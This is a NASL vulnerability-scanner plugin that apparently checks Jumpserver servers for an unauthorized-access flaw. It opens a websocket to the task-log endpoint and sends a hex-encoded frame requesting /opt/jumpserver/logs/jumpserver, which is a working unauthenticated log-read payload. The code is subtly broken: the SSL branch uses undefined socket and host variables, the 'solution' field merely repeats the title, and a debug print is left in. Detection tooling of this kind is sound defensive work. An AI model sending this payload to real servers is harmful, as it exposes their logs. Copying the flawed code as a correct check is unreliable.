include("compat.inc");


if (description)
{
  script_id(51799306);
  script_version("1.3");
  script_name(english:"Jumpserver unauthorized access vulnerability");
  script_summary(english:"Jumpserver unauthorized access vulnerability");
  script_set_attribute(attribute:"description", value:"Jumpserver unauthorized access vulnerability");
  script_set_attribute(attribute:"solution", value:"Jumpserver unauthorized access vulnerability");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www",443);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

ports = get_kb_list("Services/www");
foreach port (ports){
	soc = open_sock_tcp(port);
        strs = base64(str:rand_str(length:16));
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}
	if (get_kb_list("SSL/Transport/"+port)){
		res = http_get(item:"/core/auth/login/", port:port);
		ssl_res = https_req_get(request:res, port:port);
		if("jumpserver.js" >< ssl_res || "jumpserver.css" >< ssl_res){
			req = 'GET /ws/ops/tasks/log/ HTTP/1.1\n' +
			'Upgrade: websocket\n' +
			'Host: ' + host + '\n' +
			'Sec-WebSocket-Key: '+strs+'\n' +
			'Sec-WebSocket-Version: 13\n' +
			'Connection: upgrade\n' +
			'\n\n';
			ssl_reqs = https_req_get(request:req, port:port);
			data = hex2raw(s:"81ab9e2767fde505139ced4c45c7be054892ee534897eb4a178efb551198ec080b92f9544897eb4a178efb551198ec051a");
			send(socket:socket, data:data);
			resp = recv(socket:socket, length:2048);
			if("101 Switching Protocols" >< ssl_reqs && "Sec-WebSocket-Accept:" >< ssl_reqs){
				report = "ws://"+host+"/ws/ops/tasks/log/"+' send : {"task":"/opt/jumpserver/logs/jumpserver"}';
				security_hole(port:port, data:report);
			}	
		}
		
	}else{
		res = http_send_recv3(method: "GET", port: port, item: "/core/auth/login/");
		if("200" >< res[0] && ("jumpserver.js" >< res[2] || "jumpserver.css" >< res[2])){
			host = get_host_name();
			req = 'GET /ws/ops/tasks/log/ HTTP/1.1\n' +
			'Upgrade: websocket\n' +
			'Host: ' + host + '\n' +
			'Sec-WebSocket-Key: '+strs+'\n' +
			'Sec-WebSocket-Version: 13\n' +
			'Connection: upgrade\n' +
			'\n\n';
			socket = open_sock_tcp(port);
			if (! socket) audit(AUDIT_SOCK_FAIL, port);
			send(socket:socket, data:req);
			auth = recv(socket:socket, length:1024);
			data = hex2raw(s:"81ab9e2767fde505139ced4c45c7be054892ee534897eb4a178efb551198ec080b92f9544897eb4a178efb551198ec051a");
			send(socket:socket, data:data);
			resp = recv(socket:socket, length:2048);
                        display("=============>>>",auth);
			if("101 Switching Protocols" >< auth && "Sec-WebSocket-Accept:" >< auth){
				report = "ws://"+host+"/ws/ops/tasks/log/"+' send : {"task":"/opt/jumpserver/logs/jumpserver"}';
				security_hole(port:port, data:report);
			}
		}
	}
	close(soc);
}
